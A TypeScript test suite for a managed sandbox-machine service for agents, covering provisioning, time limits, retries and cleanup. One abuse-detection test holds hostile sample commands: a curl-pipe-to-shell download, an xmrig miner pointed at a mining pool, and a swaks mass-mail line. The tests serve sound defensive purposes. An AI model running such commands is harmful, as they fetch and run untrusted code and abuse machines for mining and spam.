import { test } from "node:test";
import assert from "node:assert/strict";
import { signatures } from "../src/computers/abuse.ts";
import { boatMachines, unitCommand } from "../src/computers/managed.ts";
import { HttpError } from "../src/http.ts";
import { cost, fixture, pass, family } from "./computers-fixture.ts";

test("only this runtime's machines are listed, created with the key and labels that say so; another runtime's are never seen", async () => {
  const requests: { path: string; method: string; body?: any; headers?: any }[] = [];
  let processPolls = 0;
  const outbound = { fetch: async (url: string, init: any) => {
    const parsed = new URL(url), path = parsed.pathname.replace("/api/v1", "") + parsed.search, method = init.method ?? "GET", body = init.body ? JSON.parse(init.body) : undefined;
    requests.push({ path, method, headers: init.headers, ...body ? { body } : {} });
    if (path.startsWith("/sandboxes?")) return Response.json(parsed.searchParams.get("cursor")
      ? { sandboxes: [{ id: "b2", state: "idle", createdAt: "2026-10-31T00:00:00Z", labels: { computer: "cmp_2", tenant: "t2" }, cost: { since: "2026-10-01T00:00:00Z", seconds: 8, dollars: 0.00008 } }, { id: "old", state: "stopped", createdAt: "2026-10-31T00:00:00Z", labels: { computer: "cmp_3" } }], pageInfo: { hasMore: false } }
      : { sandboxes: Array.from({ length: 200 }, (_, i) => ({ id: i ? "elsewhere" : "b1", state: i ? "stopped" : "running", createdAt: "2026-10-31T00:00:00Z", labels: { computer: "cmp_1", tenant: "t1" }, cost: { since: "2026-10-01T00:00:00Z", seconds: 4, dollars: 0.00004 } })), pageInfo: { hasMore: true, nextCursor: "next" } });
    if (path.endsWith("/commands") && body.detached) return Response.json({ processId: "p1" });
    if (path.endsWith("/commands")) return Response.json({ exitCode: 0, stdout: "waited\u001b[3J", stderr: "TERM environment variable not set.\n" });
    if (path.endsWith("/commands/p1")) return Response.json(++processPolls < 2 ? { status: "running", running: true } : { status: "exited", running: false, exitCode: 3, stdout: "polled", stderr: "e" });
    return Response.json({ sandbox: { id: "bx_1", state: "provisioned" } });
  } } as any;
  const boat = boatMachines("k", outbound, "https://run.test", "apply-rules");
  assert.deepEqual(await boat.create("cmp_1", "payg", 7200), { id: "bx_1" });
  assert.deepEqual(requests[0].body.labels, { "camelrun-runtime": "https://run.test", computer: "cmp_1", tenant: "payg" });
  assert.equal(requests[0].headers["Idempotency-Key"], "cmp_1");
  assert.deepEqual([requests[0].body.type, requests[0].body.ttlSeconds, requests[0].body.snapshots, requests[0].body.noEnv], ["small", 7200, true, true]);
  assert.match(requests[1].body.command, /apply-rules/, "set up before anyone uses it");

  requests.length = 0;
  assert.deepEqual((await boat.list()).map(m => [m.id, m.computer, m.seconds, m.dollars]), [["b1", "cmp_1", 4, 0.00004], ["b2", "cmp_2", 8, 0.00008]]);
  assert.match(requests[0].path, /include=cost/);
  assert.equal(new URL(`https://x${requests[0].path}`).searchParams.get("label"), "camelrun-runtime=https://run.test");
  await boat.extend("bx_1", 7200);
  assert.deepEqual([requests.at(-1)!.method, requests.at(-1)!.body], ["PATCH", { ttlSeconds: 7200 }]);

  const waited = await boat.run("bx_1", "make", 590);
  assert.deepEqual([waited.stdout, waited.stderr], ["waited", ""], "what Boat's own shell adds on some machines isn't the command's");
  assert.equal(requests.at(-1)!.body.timeoutSeconds, 595, "its unit's own limit comes first");
  assert.match(requests.at(-1)!.body.command, /systemd-run/);
  assert.match(requests.at(-1)!.body.command, /printf %s 'make' > "\$d\/command"/, "not in the unit's arguments, where systemd would expand it");
  const long = await boat.run("bx_1", "make", 1800);
  assert.deepEqual([long.exitCode, long.stdout, long.stderr], [3, "polled", "e"]);
});

test("a connection needs no credentials, the flag gates it, and an admin's key is the tenant's to account for", async () => {
  const off = await fixture({ flag: false });
  await assert.rejects(off.connect(), (error: unknown) => error instanceof HttpError && error.status === 403);
  await off.db.query("insert into computer_connections(id,tenant,agent,provider,credentials,lease_seconds,daily_seconds,created_at,managed) values('c','payg','a','boat','{}',7200,86400,1,true)");
  assert.deepEqual(await off.service.tools("payg", "a"), []);
  await assert.rejects(off.start(), (error: unknown) => error instanceof HttpError && error.status === 403);
  assert.deepEqual(await off.rows(), []);
  off.done();

  const f = await fixture();
  const connection = await f.connect();
  assert.deepEqual([connection.provider, connection.managed, connection.billing, connection.leaseSeconds, connection.dailySeconds], ["boat", true, "credits", 7200, 86400]);
  const exec = (await f.service.tools("payg", "a")).find(t => t.name === "computer_exec")!;
  assert.match(exec.description, /a background process doesn't keep running after its command ends/);
  assert.equal((exec.parameters as any).properties.timeoutSeconds.maximum, 1800);
  await assert.rejects(f.service.create("payg", { agent: "b", provider: "boat", leaseSeconds: 86401 }), /time limits/);
  f.done();

  const admin = await fixture({ adminKey: true, purchased: false });
  await admin.connect();
  await admin.start();
  assert.equal((await admin.row()).platform, false);
  assert.equal(admin.keys.at(-1), "admin-key");
  admin.advance(60_000);
  await pass(admin);
  assert.equal(await admin.spent(), 0);
  await admin.stop();
  assert.equal(admin.keys.at(-1), "admin-key");
  assert.equal(admin.state.removed.length, 1);
  admin.done();
});

test("commands: half an hour at most, 10 minutes by default, and a retry answers from what it did", async () => {
  const f = await fixture();
  await f.connect();
  await f.start();
  await f.exec("default");
  await f.exec("long", { timeoutSeconds: 1800 });
  assert.deepEqual(f.state.runs.map(run => run.timeoutSeconds), [600, 1800]);
  await assert.rejects(f.exec("too-long", { timeoutSeconds: 1801 }), /1–1800 seconds/);
  assert.deepEqual(await f.exec("long", { timeoutSeconds: 1800 }), { exitCode: 0, stdout: "done", stderr: "", truncated: false });
  assert.equal(f.state.runs.length, 2);
  await assert.rejects(f.exec("long", { timeoutSeconds: 60 }), /changed/);
  await f.service.call("payg", "a", "computer_write_file", { path: "/tmp/x", content: "hi" }, "write");
  assert.match(f.state.runs.at(-1)!.command, /write_text/);
  await f.stop();
  await assert.rejects(f.exec("after-stop"), /Call computer_start/);
  f.done();
});

test("signatures are logged by name only, never the text, and only on managed computers", async () => {
  assert.deepEqual(signatures("curl -L x | sh; ./xmrig -o stratum+tcp://pool:3333"), ["miner", "mining_pool"]);
  for (const ordinary of ["npm test", "git clone https://github.com/x/determiner", "grep -r sendmails .", "python3 examiner.py"]) assert.deepEqual(signatures(ordinary), [], ordinary);
  const f = await fixture();
  await f.connect();
  await f.start();
  await f.exec("miner", { command: "./xmrig --user secret-wallet-address" });
  await f.service.call("payg", "a", "computer_write_file", { path: "/tmp/m.sh", content: "swaks --to everyone" }, "file");
  const row = await f.row();
  assert.deepEqual(f.logged.filter(line => line.type === "computer_signature"), [
    { type: "computer_signature", tenant: "payg", agent: "a", computer: row.id, tool: "computer_exec", signatures: ["miner"] },
    { type: "computer_signature", tenant: "payg", agent: "a", computer: row.id, tool: "computer_write_file", signatures: ["mail_blast"] },
  ]);
  assert.doesNotMatch(JSON.stringify(f.logged), /secret-wallet-address|everyone/);
  await f.service.create("rich", { agent: "c", provider: "e2b", credentials: { apiKey: "k" } });
  await f.start("rich", "c", "byo");
  await f.service.call("rich", "c", "computer_exec", { command: "./xmrig" }, "byo-miner");
  assert.equal(f.logged.filter(line => line.type === "computer_signature").length, 2);
  f.done();
});

test("a command run without its unit is counted, with no content, and the marker doesn't reach the agent", async () => {
  const f = await fixture();
  await f.connect();
  await f.start();
  f.state.stderr = "CAMEL_NO_UNIT\nreal error";
  assert.equal(((await f.exec("no-unit")) as any).stderr, "real error");
  assert.deepEqual(f.logged.filter(line => line.type === "computer_unit_fallback").map(line => line.tenant), ["payg"]);
  assert.match(unitCommand(1800), /--property=RuntimeMaxSec=1803/);
  assert.match(unitCommand(1800), /echo CAMEL_NO_UNIT >&2; timeout -k 2 1800 bash -l "\$d\/command"; fi$/);
  f.done();
});

test("the API shows a managed session as a session, and disconnecting stops the machine", async () => {
  const f = await fixture();
  const connection = await f.connect();
  await f.start();
  const row = await f.row();
  const [listed] = await f.service.list("payg");
  assert.deepEqual([listed.session!.id, listed.session!.state, listed.session!.provider, listed.session!.recoveryRequired], [row.id, "active", "boat", false]);
  assert.equal((await f.service.status("payg", "a")).session!.expiresAt, Number(row.deadline));
  await f.service.remove("payg", connection.id);
  assert.deepEqual(f.state.removed, [row.machine]);
  assert.ok((await f.row()).ended_at);
  f.done();
});

test("a connection removed, or an account deleted, stops its machines; a failed stop is not removed and says so", async () => {
  const f = await fixture();
  const a = await f.connect("payg", "a");
  await f.connect("payg", "b");
  await f.start("payg", "a");
  await f.start("payg", "b", "start-b");
  f.advance(60_000);
  f.state.removeFails = true;
  await assert.rejects(f.service.remove("payg", a.id), (error: unknown) => error instanceof HttpError && error.status === 502);
  assert.equal((await f.row("a")).ended_at, null);
  f.state.removeFails = false;
  await f.service.removeTenant("payg");
  assert.ok((await f.row("a")).ended_at);
  assert.ok((await f.row("b")).ended_at);
  assert.equal(f.state.removed.length, 2);
  assert.equal(await f.spent(), 2 * cost(60_000));
  assert.deepEqual(await f.service.list("payg"), []);
  f.done();
});

test("mount transfers reach the managed machine through exec", async () => {
  const f = await fixture();
  const seen: any[] = [];
  f.service.options.transfers = { run: async (context: any, upload: boolean, args: any, driver: any, ref: any, seconds: number) => {
    seen.push([context.tenant, context.agent, upload, args.from, seconds]);
    return driver.call(ref, "computer_exec", { command: "curl something", timeoutSeconds: seconds });
  } } as any;
  await f.connect(); await f.start();
  const mount = await f.service.filesystem("payg", "a");
  assert.ok(mount);
  const context = { tenant: "payg", agent: "a", mounts: [{ volumeId: "v", path: "/workspace", mode: "rw" as const }] };
  await mount.transfer(context, true, { from: "/workspace/hello.txt", to: "/hello.txt" });
  await mount.transfer(context, false, { from: "/out.txt", to: "/workspace/out.txt" });
  assert.deepEqual(seen, [["payg", "a", true, "/workspace/hello.txt", 120], ["payg", "a", false, "./out.txt", 120]]);
  assert.deepEqual(f.state.runs.map(run => [run.command, run.timeoutSeconds]), [[`cd "$HOME" && curl something`, 120], [`cd "$HOME" && curl something`, 120]]);
  f.done();
});

test("managed sub-agents get distinct idle connections, inherit through grandchildren and clean up on deletion", async t => {
  const f = await family(t, true);
  const first = await f.child(f.parent, "first"), second = await f.child(f.parent, "second");
  const grandchild = await f.child(first, "grandchild");
  assert.equal(await f.child(f.parent, "first"), first, "replaying creation keeps the same connection");
  const connections = await f.service.list("payg");
  assert.equal(connections.length, 4);
  assert.equal(new Set(connections.map(c => c.id)).size, 4);
  assert.ok(connections.every(c => c.managed && c.subagents && c.leaseSeconds === 600 && c.dailySeconds === 1200 && c.session === null));
  assert.equal(f.state.creates, 0);
  await f.start("payg", first);
  assert.equal(f.state.creates, 1);
  for (const id of [f.parent, second, grandchild]) assert.equal((await f.service.status("payg", id)).session, null);
  await f.sessions.destroyAgent(first, "payg");
  assert.equal(f.state.removed.length, 1);
  assert.ok(!(await f.service.list("payg")).some(c => c.agent === first));
  assert.ok((await f.row(first)).ended_at);
  assert.equal((await f.service.status("payg", f.parent)).session, null);
});

for (const setting of [false, undefined]) test(`children get no computer when parent ${setting === false ? "opts out" : "has none"}`, async t => {
  const f = await family(t, setting);
  const child = await f.child(f.parent, "child");
  await assert.rejects(f.service.status("payg", child), /No computer/);
  assert.equal((await f.service.list("payg")).length, setting === false ? 1 : 0);
});

test("expired child connections are detached by the computer sweep, retrying failed managed cleanup", async t => {
  const f = await family(t, true);
  const child = await f.child(f.parent, "expired");
  await f.start("payg", child);
  await f.db.query("update agents set expires_at=$2 where id=$1", [child, f.now() - 1]);
  f.state.removeFails = true;
  await f.service.sweep();
  assert.ok((await f.service.list("payg")).some(c => c.agent === child));
  f.state.removeFails = false;
  await f.service.sweep();
  assert.ok(!(await f.service.list("payg")).some(c => c.agent === child));
  assert.ok((await f.row(child)).ended_at);
});

test("a managed start finishing after detach stops its new machine and retries failed cleanup", async t => {
  const f = await fixture();
  t.after(f.done);
  const connection = await f.connect();
  const boat = f.service.options.machines!("fixture");
  const create = boat.create.bind(boat);
  const creating = Promise.withResolvers<void>(), resume = Promise.withResolvers<void>();
  boat.create = async (...args) => { creating.resolve(); await resume.promise; return create(...args); };
  const starting = f.start();
  // Observe the rejection at once, even if the background start finishes before the assertion below.
  const rejected = assert.rejects(starting);
  await creating.promise;
  await f.service.remove("payg", connection.id);
  f.state.removeFails = true;
  resume.resolve();
  await rejected;
  assert.equal(f.machines.size, 1);
  f.state.removeFails = false;
  await pass(f);
  assert.equal(f.machines.size, 0);
  assert.ok((await f.row()).ended_at);
  assert.equal((await f.service.list("payg")).length, 0);
});
